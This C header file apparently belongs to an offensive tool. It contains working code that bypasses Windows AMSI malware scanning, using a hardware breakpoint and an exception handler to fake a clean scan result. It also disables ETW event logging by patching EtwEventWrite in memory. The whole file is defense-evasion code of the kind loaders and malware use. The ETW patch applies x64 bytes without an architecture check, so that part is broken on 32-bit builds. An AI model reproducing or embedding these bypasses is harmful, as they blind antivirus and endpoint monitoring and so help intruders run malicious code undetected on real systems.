#pragma once
#include <windows.h>

// ---------- AMSI bypass: hardware breakpoint on AmsiScanBuffer ----------

static LPVOID g_amsiScanAddr = NULL;

static LONG WINAPI amsi_veh_handler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    if (pExInfo->ExceptionRecord->ExceptionAddress != g_amsiScanAddr)
        return EXCEPTION_CONTINUE_SEARCH;

#ifdef _WIN64
    // AmsiScanBuffer(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, HAMSISESSION, AMSI_RESULT*)
    // x64: params 1-4 in RCX,RDX,R8,R9 — params 5-6 on stack
    // At function entry: RSP+0x00 = return addr, shadow[0x08-0x20], param5=RSP+0x28, param6=RSP+0x30
    ULONG_PTR* pStack = (ULONG_PTR*)pExInfo->ContextRecord->Rsp;

    // 6th param = AMSI_RESULT* → set to AMSI_RESULT_CLEAN (0)
    DWORD* pResult = (DWORD*)pStack[6];
    if (pResult) *pResult = 0;

    // Return S_OK: skip entire function by returning to caller
    pExInfo->ContextRecord->Rax = S_OK;
    pExInfo->ContextRecord->Rip = pStack[0];  // return address
    pExInfo->ContextRecord->Rsp += 8;          // pop return address
#else
    // x86: all params on stack
    // ESP+0x00 = return addr, params start at ESP+0x04
    // param6 = ESP+0x18
    ULONG_PTR* pStack = (ULONG_PTR*)pExInfo->ContextRecord->Esp;
    DWORD* pResult = (DWORD*)pStack[6];
    if (pResult) *pResult = 0;
    pExInfo->ContextRecord->Eax = S_OK;
    pExInfo->ContextRecord->Eip = pStack[0];
    pExInfo->ContextRecord->Esp += 4;
#endif

    return EXCEPTION_CONTINUE_EXECUTION;
}

static BOOL set_hw_bp(LPVOID addr, int reg) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) return FALSE;

    switch (reg) {
        case 0: ctx.Dr0 = (DWORD_PTR)addr; break;
        case 1: ctx.Dr1 = (DWORD_PTR)addr; break;
        case 2: ctx.Dr2 = (DWORD_PTR)addr; break;
        case 3: ctx.Dr3 = (DWORD_PTR)addr; break;
        default: return FALSE;
    }

    ctx.Dr7 &= ~(3ULL << (16 + reg * 4));   // condition = 00 (execute)
    ctx.Dr7 &= ~(3ULL << (18 + reg * 4));   // length = 00 (1 byte)
    ctx.Dr7 |= (1ULL << (reg * 2));          // local enable
    ctx.Dr6 = 0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    return SetThreadContext(hThread, &ctx);
}

static BOOL bypass_amsi(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE;

    g_amsiScanAddr = (LPVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!g_amsiScanAddr) return FALSE;

    if (!AddVectoredExceptionHandler(1, amsi_veh_handler))
        return FALSE;

    if (!set_hw_bp(g_amsiScanAddr, 0))
        return FALSE;

    return TRUE;
}

// ---------- ETW bypass: patch EtwEventWrite to xor rax,rax; ret ----------

static BOOL bypass_etw(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    LPVOID pEtwEventWrite = (LPVOID)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, 4, PAGE_READWRITE, &oldProtect))
        return FALSE;

    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
    memcpy(pEtwEventWrite, patch, sizeof(patch));

    VirtualProtect(pEtwEventWrite, 4, oldProtect, &oldProtect);

    return TRUE;
}
